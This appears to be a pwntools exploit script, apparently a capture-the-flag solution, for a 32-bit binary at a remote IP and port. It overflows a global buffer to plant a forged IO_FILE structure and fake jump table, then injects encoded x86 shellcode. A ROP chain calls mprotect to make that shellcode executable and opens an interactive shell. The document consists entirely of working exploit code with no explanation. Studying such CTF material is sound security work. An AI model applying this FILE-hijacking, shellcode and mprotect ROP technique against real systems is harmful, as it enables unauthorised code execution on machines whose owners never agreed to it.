from pwn import *
context(log_level="debug")

# p = process("./fake")
p = remote('106.75.93.221',12345 )

x_addr = 0x80EF9E0
fp_addr = 0x80EFA00
jump_addr = fp_addr+0x10+4*0x25+4+8
eip_addr = 0x805069d
read_addr = 0x8071460
printf_addr = 0x804F6D0
Welcome_addr = 0x0804889C
menu_addr = 0x8048AFF
p_ret = 0x080481d1
ppp_ret = 0x0804f7da
mprotect_addr = 0x08071FD0
page_size = 4096
p.recvuntil("name?\n")
payload = "a"*(fp_addr-x_addr)+p32(fp_addr+4)
# IO_FILE = p32(x_addr)*0x25+p32(jump_addr)

x=0x10
IO_FILE = p32(fp_addr)*(0x11-x)+p32(0)*x+"\x00\x00"+"\x00"+"\x00"+p32(fp_addr)*0x13+p32(jump_addr)
JUMP = p32(0)*2+p32(eip_addr)*21
gdb.attach(p,"b*0x805069d\nb*0x805442A\nb*0x80534bb\nc")
payload +=IO_FILE+JUMP

shellcode_addr = (0x80EF9E0 + len(payload))
print "shellcode_addr="+hex(shellcode_addr)
exec_addr = (0x80EF9E0 + len(payload))&~(page_size-1)
buf =  ""
buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x9d\x3a\x39\x8f\x83\xee\xfc\xe2\xf4\xf7\x31"
buf += "\x61\x16\xcf\x5c\x51\xa2\xfe\xb3\xde\xe7\xb2\x49\x51"
buf += "\x8f\xf5\x15\x5b\xe6\xf3\xb3\xda\xdd\x75\x32\x39\x8f"
buf += "\x9d\x15\x5b\xe6\xf3\x15\x4a\xe7\x9d\x6d\x6a\x06\x7c"
buf += "\xf7\xb9\x8f"
shellcode = buf

payload+=shellcode

p.sendline(payload)
p.recvuntil("> ")

payload2 = p32(mprotect_addr)+p32(ppp_ret)+p32(exec_addr)+p32(page_size)+p32(7)+p32(shellcode_addr)
p.sendline("3"+"a"*(0x3c-1)+payload2)

p.interactive()